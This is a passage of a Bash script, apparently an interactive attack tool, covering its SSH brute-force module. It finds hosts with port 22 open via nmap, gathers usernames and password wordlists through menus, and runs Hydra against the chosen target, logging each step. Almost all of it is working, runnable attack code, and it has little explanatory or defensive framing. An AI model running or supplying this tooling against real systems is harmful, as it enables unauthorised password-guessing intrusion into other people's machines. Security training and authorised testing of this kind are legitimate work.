		cat $SSH_DIR_PATH/$SSH_FNAME | egrep -v '^#' | grep 22 | grep -i open | awk -F " " '{print $2}' > $SSH_DIR_PATH/$SSHIP_FNAME
		#validates if $SSH_OPEN is not empty
		if [ ! -z "$SSH_OPEN" ]; then
			echo
			echo -e "${Light_Purple}--------------------------${NC}"
			echo -e "${White}${Light_Cyan}SSH BRUTEFORCE${NC} ${White}ATTACK MENU${NC}"
			echo -e "${Light_Purple}--------------------------${NC}"
			echo -e "${White}[*]${NC} Host(s) Detected: ${Cyan}$SSH_OPEN${NC}"
			#validate if $SSHIP_FNAME file exists and output the list of ip with port 22 open
			if [ -f "$SSH_DIR_PATH/$SSHIP_FNAME" ]; then
				while read ssh_ip
				do
					echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $ssh_ip)${NC}"
				done < $SSH_DIR_PATH/$SSHIP_FNAME
				echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
				#assign checker variable for while loop
				SSH_TARGET_CHECKER=0
				while [ "$SSH_TARGET_CHECKER" -eq 0 ]
				do
					echo -e -n "${Yellow}[?]${NC} Enter your target: "
					read SSH_TARGET
					#validate if $SSH_TARGET is empty
					if [ -z "$SSH_TARGET" ]; then
						echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
					else
						if grep -Fxq $SSH_TARGET $SSH_DIR_PATH/$SSHIP_FNAME; then
							#get user to either to proceed with SSH Bruteforce
							HYDRA_NAME_MENU
							SSH_TARGET_CHECKER=1
						elif [ "$SSH_TARGET" == "R" ] || [ "$SSH_TARGET" == "r" ]; then
							#presents to user the main menu to choose a single target or to scan for a local area network
							MAIN_MENU
							SSH_TARGET_CHECKER=1
						else
							echo -e "${Light_Red}[!]${NC} Please choose the target from the list only. Enter '${Orange}R${NC}' to return to Main Menu.\n"
						fi
					fi
				done
			else
				echo -e "${Light_Red}[!]${NC} $SSHIP_FNAME file does not exist. Please run $0 again."
			fi
		else
			echo -e "\n${Light_Purple}[*]${NC} Remote Desktop Protocol Attack Target:"
			echo -e "${Light_Red}[!]${NC} No host(s) with Windows OS detected for ${Green}$SUBNET_WM${NC}."
		fi
	else
		echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}


#present hydra menu to user hydra bruteforce attack login username options
function HYDRA_NAME_MENU {
	#assign file name for hydra files
	HYDRA_NAME_LIST="login_name.lst"
	echo
	echo -e "${Light_Purple}---------------------${NC}"
	echo -e "${Light_Cyan}HYDRA${NC} ${White}MENU (${NC}${Light_Green}USERNAME${NC}${White})${NC}"
	echo -e "${Light_Purple}---------------------${NC}"
	echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Enter A ${Cyan}Single${NC} Login Username"
	echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Load A ${Cyan}File List${NC} Of Usernames"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to SSH Bruteforce Attack Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}---------------------${NC}"
	#assign checker variable for while loop
	HYDRA_NAME_CHECKER=0
	while [ "$HYDRA_NAME_CHECKER" -eq 0 ]
	do
		#allow user to select using a single login username or to use a list of usernames
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read HYDRA_NAME_TYPE
		case $HYDRA_NAME_TYPE in
			1 )
			#get user input for single login username
			HYDRA_SINGLE_NAME
			HYDRA_NAME_CHECKER=1
			shift
			;;
			2 )
			#get user to input filename for the list of login usernames
			HYDRA_FNAME
			HYDRA_NAME_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#presents SSH Bruteforce Attack menu to the user
			SSH_BF_MENU
			HYDRA_NAME_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift
			;;
		esac
	done
}

#get user input for single login username
function HYDRA_SINGLE_NAME {
	#assign checker variable for while loop
	SINGLE_NAME_CHECKER=0
	while [ "$SINGLE_NAME_CHECKER" -eq 0 ]
	do
		echo -e -n "\n${Yellow}[?]${NC} Please enter the login ${Cyan}username${NC}: "
		read SINGLE_NAME
		#validate if $SINGLE_NAME is empty
		if [ -z "$SINGLE_NAME" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		else
			#assign checker variable for while loop
			CONFIRM_SNAME_CHECKER=0
			while [ "$CONFIRM_SNAME_CHECKER" -eq 0 ]
			do
				#get user confirmation for single login username
				echo -e -n "${Yellow}[?]${NC} Confirm using ${Cyan}$SINGLE_NAME${NC}? (y/n) "
				read CONFIRM_SINGLE_NAME
					case $CONFIRM_SINGLE_NAME in
					y | Y | Yes | YES | yes )
					echo $SINGLE_NAME > $SSH_DIR_PATH/$HYDRA_NAME_LIST
					#present hydra menu to user hydra bruteforce attack password options
					HYDRA_PW_MENU
					CONFIRM_SNAME_CHECKER=1
					SINGLE_NAME_CHECKER=1
					shift
					;;
					n | N | No | NO | no )
					#present hydra menu to user hydra bruteforce attack login username options
					HYDRA_NAME_MENU
					CONFIRM_SNAME_CHECKER=2
					SINGLE_NAME_CHECKER=2
					shift
					;;
					* )
					echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'.\n"
					shift
					;;
				esac	
			done
		fi
	done
}

#get user to input filename for the list of login usernames
function HYDRA_FNAME {
	#assign checker variable for while loop
	NAME_FNAME_CHECKER=0
	while [ "$NAME_FNAME_CHECKER" -eq 0 ]
	do
		#get user input filename for the list of login usernames
		echo -e -n "\n${Yellow}[?]${NC} Please enter the ${Cyan}filename${NC} of the list of login usernames: "
		read NAME_FNAME
		#validate if $NAME_FNAME is empty
		if [ -z "$NAME_FNAME" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		else
			#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
			SEARCH_FNAME $NAME_FNAME
			#validate if $FNAME_PATH is not empty
			if [ ! -z "$FNAME_PATH" ]; then
				#assign checker variable for while loop
				CONFIRM_FNAME_CHECKER=0
				while [ "$CONFIRM_FNAME_CHECKER" -eq 0 ]
				do
					#get user confirmation for filename
					echo -e -n "${Yellow}[?]${NC} Confirm filename: ${Cyan}$FNAME_PATH${NC} (y/n) "
					read CONFIRM_FNAME
					case $CONFIRM_FNAME in
						y | Y | Yes | YES | yes )
						#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
						SEARCH_FNAME $NAME_FNAME
						#validate if $FNAME_PATH is not empty
						if [ ! -z "$FNAME_PATH" ]; then
							cat $FNAME_PATH > $SSH_DIR_PATH/$HYDRA_NAME_LIST
							#present hydra menu to user hydra bruteforce attack password options
							HYDRA_PW_MENU
							CONFIRM_FNAME_CHECKER=1
							NAME_FNAME_CHECKER=1
						else
							echo -e "${Light_Red}[!]${NC} The file ${Cyan}$NAME_FNAME${NC} ${Light_Red}does not exits${NC}. Please try again."
							#present hydra menu to user hydra bruteforce attack login username options
							HYDRA_NAME_MENU
							CONFIRM_FNAME_CHECKER=1
							NAME_FNAME_CHECKER=1
						fi
						shift
						;;
						n | N | No | NO | no )
						#present hydra menu to user hydra bruteforce attack login username options
						HYDRA_NAME_MENU
						CONFIRM_FNAME_CHECKER=2
						NAME_FNAME_CHECKER=1
						shift
						;;
						* )
						echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'.\n"
						shift
						;;
					esac	
				done	
			else
				echo -e "${Light_Red}[!]${NC} The file ${Cyan}$NAME_FNAME${NC} ${Light_Red}does not exits${NC}. Please try again."
				#present hydra menu to user hydra bruteforce attack login username options
				HYDRA_NAME_MENU
				NAME_FNAME_CHECKER=1
			fi	
		fi
	done
}

#present hydra menu to user hydra bruteforce attack password options
function HYDRA_PW_MENU {
	#assign file name for hydra files
	HYDRA_PW_LIST="password.lst"
	echo
	echo -e "${Light_Purple}---------------------${NC}"
	echo -e "${Light_Cyan}HYDRA${NC} ${White}MENU (${NC}${Light_Green}PASSWORD${NC}${White})${NC}"
	echo -e "${Light_Purple}---------------------${NC}"
	echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Enter A ${Cyan}Single${NC} Password"
	echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Load A ${Cyan}File List${NC} Of Password"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to SSH Bruteforce Attack Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}---------------------${NC}"
	#assign checker variable for while loop
	HYDRA_PW_CHECKER=0
	while [ "$HYDRA_PW_CHECKER" -eq 0 ]
	do
		#allow user to select using a single password or to use a list of passwords
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read HYDRA_PW_TYPE
		case $HYDRA_PW_TYPE in
			1 )
			#get user input for single password
			HYDRA_SINGLE_PW
			HYDRA_PW_CHECKER=1
			shift
			;;
			2 )
			#get user to input filename for the list of passwords
			HYDRA_FPW
			HYDRA_PW_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#presents SSH Bruteforce Attack menu to the user
			SSH_BF_MENU
			HYDRA_PW_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			CHOOSE_RDPFINAL_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift
			;;
		esac
	done
}

#get user input for single password
function HYDRA_SINGLE_PW {
	#assign checker variable for while loop
	SINGLE_PW_CHECKER=0
	while [ "$SINGLE_PW_CHECKER" -eq 0 ]
	do
		echo -e -n "\n${Yellow}[?]${NC} Please enter the single ${Cyan}password${NC}: "
		read SINGLE_PW
		#validate if $SINGLE_PW is empty
		if [ -z "$SINGLE_PW" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		else
			#assign checker variable for while loop
			CONFIRM_SPW_CHECKER=0
			while [ "$CONFIRM_SPW_CHECKER" -eq 0 ]
			do
				#get user confirmation for single login username
				echo -e -n "${Yellow}[?]${NC} Confirm using ${Cyan}$SINGLE_PW${NC}? (y/n) "
				read CONFIRM_SINGLE_PW
					case $CONFIRM_SINGLE_PW in
					y | Y | Yes | YES | yes )
					echo $SINGLE_PW> $SSH_DIR_PATH/$HYDRA_PW_LIST
					#execute bruteforce using hydra on selected target $SSHBF_TARGET $HYDRA_NAME_LIST $HYDRA_PW_LIST
					HYDRA_RUN
					#presents SSH Bruteforce Attack menu to the user
					SSH_BF_MENU
					CONFIRM_SPW_CHECKER=1
					SINGLE_PW_CHECKER=1
					shift
					;;
					n | N | No | NO | no )
					#present hydra menu to user hydra bruteforce attack password options
					HYDRA_PW_MENU
					CONFIRM_SPW_CHECKER=2
					SINGLE_PW_CHECKER=2
					shift
					;;
					* )
					echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
					shift
					;;
				esac	
			done
		fi
	done
}

#get user to input filename for the list of passwords
function HYDRA_FPW {
	#assign checker variable for while loop
	NAME_FPW_CHECKER=0
	while [ "$NAME_FPW_CHECKER" -eq 0 ]
	do
		#get user input filename for the list of passwords
		echo -e -n "\n${Yellow}[?]${NC} Please enter the ${Cyan}filename${NC} of the list of passwords: "
		read NAME_FPW
		#validate if $NAME_FPW is empty
		if [ -z "$NAME_FPW" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		else
			#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
			SEARCH_FNAME $NAME_FPW
			#validate if $FNAME_PATH is not empty
			if [ ! -z "$FNAME_PATH" ]; then
				#assign checker variable for while loop
				CONFIRM_FPW_CHECKER=0
				while [ "$CONFIRM_FPW_CHECKER" -eq 0 ]
				do
					#get user confirmation for the filename
					echo -e -n "${Yellow}[?]${NC} Confirm filename:${Cyan}$FNAME_PATH${NC} (y/n) "
					read CONFIRM_FPW
						case $CONFIRM_FPW in
						y | Y | Yes | YES | yes )
						#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
						SEARCH_FNAME $NAME_FPW
						#validate if $FNAME_PATH is not empty
						if [ ! -z "$FNAME_PATH" ]; then
							cat $FNAME_PATH > $SSH_DIR_PATH/$HYDRA_PW_LIST
							#execute bruteforce using hydra on selected target $SSHBF_TARGET $HYDRA_NAME_LIST $HYDRA_PW_LIST
							HYDRA_RUN
							#presents SSH Bruteforce Attack menu to the user
							SSH_BF_MENU
							CONFIRM_FPW_CHECKER=1
							NAME_FPW_CHECKER=1
						else
							echo -e "${Light_Red}[!]${NC} The file ${Cyan}$NAME_FPW${NC} ${Light_Red}does not exits${NC}. Please try again."
							#present hydra menu to user hydra bruteforce attack login username options
							HYDRA_NAME_MENU
							CONFIRM_FPW_CHECKER=1
							NAME_FPW_CHECKER=1
						fi
						shift
						;;
						n | N | No | NO | no )
						#present hydra menu to user hydra bruteforce attack password options
						HYDRA_PW_MENU
						CONFIRM_FPW_CHECKER=2
						NAME_FPW_CHECKER=1
						shift
						;;
						* )
						echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
						shift
						;;
					esac	
				done
			else
				echo -e "${Light_Red}[!]${NC} The file ${Cyan}$NAME_FPW${NC} ${Light_Red}does not exits${NC}. Please try again."
				#present hydra menu to user hydra bruteforce attack password options
				HYDRA_PW_MENU
				NAME_FPW_CHECKER=1
			fi
		fi
	done
}

#execute bruteforce using hydra on selected target $SSHBF_TARGET $HYDRA_NAME_LIST $HYDRA_PW_LIST
function HYDRA_RUN {
	cd $SSH_DIR_PATH
	HYDRA_PW_LIST="password.lst"
	HYDRA_NAME_LIST="login_name.lst"
	#assign nmap output filename
	SSH_FILENAME=$SSH_TARGET"-"$DATE_TIME
	#assign session time to variable
	DATETIME_UTC_SESSION=''
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "${Light_Purple}hydra -L${NC} ${Cyan}$SSH_DIR_PATH/$HYDRA_NAME_LIST${NC} ${Light_Purple}-P${NC} ${Cyan}$SSH_DIR_PATH/$HYDRA_PW_LIST${NC} ${Green}$SSH_TARGET${NC} ${Light_Purple}-t${NC} ${Cyan}4${NC} ${Light_Purple}ssh${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "\n${Light_Purple}[-]${NC} Executing Hydra Bruteforce Attack..."
	hydra -L $SSH_DIR_PATH/$HYDRA_NAME_LIST -P $SSH_DIR_PATH/$HYDRA_PW_LIST $SSH_TARGET -t 4 ssh -o $SSH_FILENAME.ssh
	SSH_RESULT=$(cat $SSH_DIR_PATH/$SSH_FILENAME.ssh | grep host | grep 22) 
	#validate if $SSH_RESULT is not empty
	if [ ! -z "$SSH_RESULT" ]; then
		echo $SSH_RESULT >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	else
		echo -e "\n${Light_Red}[!]${NC} SSH Bruteforce Attack was not successful." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	fi
	#display the path of saved files to the user
	echo -e "File Saved: $(echo $SSH_DIR_PATH)/$(echo $SSH_FILENAME).ssh" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
}

#execute nmap on selected target for SSH
function SSH_NMAP_RUN {
	#assign $SSH_TARGET mac address
	SSH_TARGETIP_MAC=$(arp-scan $SSH_TARGET | egrep ^$(echo $SSH_TARGET) | awk '{print $2}')
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign nmap output filename
	SSH_NMAP_FILENAME=$SSH_TARGET"-"$DATE_TIME
	echo -e "\n${Light_Purple}[-]${NC} Executing Nmap scanning for SSH Protocol. Please be patient..."
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo
	#access $SSH_DIR_PATH to store files generated by the script
	cd $SSH_DIR_PATH
	echo -e "${Light_Purple}nmap${NC} ${Green}$(echo $SSH_TARGET)${NC} ${Light_Purple}-Pn${NC} ${Light_Purple}-p${NC} ${Cyan}22${NC} ${Light_Purple}--open${NC} ${Light_Purple}-sV${NC} ${Light_Purple}--reason${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#execute nmap scan and save the output
	nmap $(echo $SSH_TARGET) -Pn -p 22 --open -sV --reason -oA $SSH_NMAP_FILENAME | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME 
	#validate if $SSH_TARGETIP_MAC.gnmap file exists
	if [ -f "$SSH_NMAP_FILENAME.nmap" ]; then
		SSH_GNMAP_VALIDATE=$(cat $SSH_NMAP_FILENAME.nmap | egrep -v '^#' | grep 22 | grep open )
		#validate if fthe file has any results
		if [ -z "$SSH_GNMAP_VALIDATE" ]; then
			echo -e "\n${Light_Red}[!]${NC} No Nmap scan results for open ${Cyan}port 22${NC}. Please choose another target." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
		else
			#convert $SSH_NMAP_FILENAME.xml to $SSH_NMAP_FILENAME.html
			xsltproc -o $SSH_NMAP_FILENAME.html $SSH_NMAP_FILENAME.xml
			#execute firefox in root. takes in 1 argument
			FIREFOX_RUN $SSH_DIR_PATH/$SSH_NMAP_FILENAME.html
			#display the path of saved files to the user
			echo -e "File Saved: $(echo $SSH_DIR_PATH)/$(echo $SSH_TARGET).nmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $SSH_DIR_PATH)/$(echo $SSH_TARGET).gnmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $SSH_DIR_PATH)/$(echo $SSH_TARGET).xml" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $SSH_DIR_PATH)/$(echo $SSH_TARGET).html" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#present hydra menu to user hydra bruteforce attack login username options
			HYDRA_NAME_MENU 
		fi
	else
		echo -e "${Light_Red}[!]${NC} $SSH_GNMAP_VALIDATE file does not exist. Please run $0 again."
		exit
	fi
}

#output the latest session file and checks if the user would like to remove the files generatated by the script
function RM_SCRIPT_FILES {
	#change to $SESSION_DIR_PATH directory
	cd $SESSION_DIR_PATH
	#list the most recent session file
	SESSION_RECORD=$(ls -lArt | tail -n 1 | awk '{print $NF}')
	#assign checker variable for while loop
	OUTPUT_SESSION_CHECKER=0
	while [ "$OUTPUT_SESSION_CHECKER" -eq 0 ]
	do
		echo
		echo -e -n "${Yellow}[?]${NC} Would you like to output the current session's log? (y/n) "
		read OUTPUT_SESSION
		case $OUTPUT_SESSION in
			y | Y | yes | Yes | YES)
			#output the session file
			echo
			cat $SESSION_RECORD
			OUTPUT_SESSION_CHECKER=1
			shift
			;;
			n | N | no | No | NO)
			OUTPUT_SESSION_CHECKER=1
			shift
			;;
			*)
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
			shift
			;;
		esac
	done
	#assign checker variable for while loop
	RM_FILES_CHECKER=0
	while [ "$RM_FILES_CHECKER" -eq 0 ]
	do
		echo
		echo -e -n "${Yellow}[?]${NC} Would you like to remove all files generated by the script? (y/n) "
		read RM_FILES
		case $RM_FILES in
			y | Y | yes | Yes | YES)
			#remove all directories and files generated by the script
			cd ~
			rm -r $MAIN_DIR
			echo -e "\n${Light_Purple}[*]${NC} Files successfully removed."
			RM_FILES_CHECKER=1
			shift
			;;
			n | N | no | No | NO)
			RM_FILES_CHECKER=1
			shift
			;;
			*)
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
			shift
			;;
		esac
	done
}

#display the script banner to the user
BANNER
#validate if user is root
ROOT_VALIDATION
#validate if the require packages are installed
CHECK_PACKAGES
#install the missing requires packages
INSTALL_PACKAGES
#checks if .Xauthority file exists and assign a variable
XAUTH_RESULT=$(ls -la | grep -i xauthority)
#setup the folders to store files generated by the script
MAIN_DIR_SETUP
#fetch subnetwork information from system 
GET_SUBNETWORK
#presents to user the main menu to choose a single target or to scan for a local area network
MAIN_MENU
